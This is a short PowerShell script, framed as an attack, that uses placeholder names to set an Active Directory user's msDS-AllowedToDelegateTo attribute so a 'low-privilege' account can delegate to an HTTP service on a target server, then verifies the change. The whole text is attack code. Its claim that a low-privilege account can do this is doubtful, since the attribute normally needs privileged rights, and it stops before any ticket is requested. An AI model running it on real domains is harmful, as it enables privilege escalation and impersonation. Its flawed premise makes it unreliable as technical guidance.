# Import the ActiveDirectory module
Import-Module ActiveDirectory

# Set the domain to be used for the attack
$domain = "dbz.com"

# Set the low-privilege account and target resource to be used in the attack
$lowPrivilegeAccount = "son.goku"
$targetResource = "SRV01"

# Set the SPN (Service Principal Name) for the target resource
$targetSPN = "HTTP/$targetResource.$domain"

# Get the low-privilege account's user object
$user = Get-ADUser -Identity $lowPrivilegeAccount -Server $domain

# Set the low-privilege account's msDS-AllowedToDelegateTo attribute to include the target resource's SPN
Set-ADUser -Identity $user -Add @{'msDS-AllowedToDelegateTo'=$targetSPN}

# Check the low-privilege account's msDS-AllowedToDelegateTo attribute to verify that the target resource's SPN has been added
Get-ADUser -Identity $user -Properties msDS-AllowedToDelegateTo | Select-Object -ExpandProperty msDS-AllowedToDelegateTo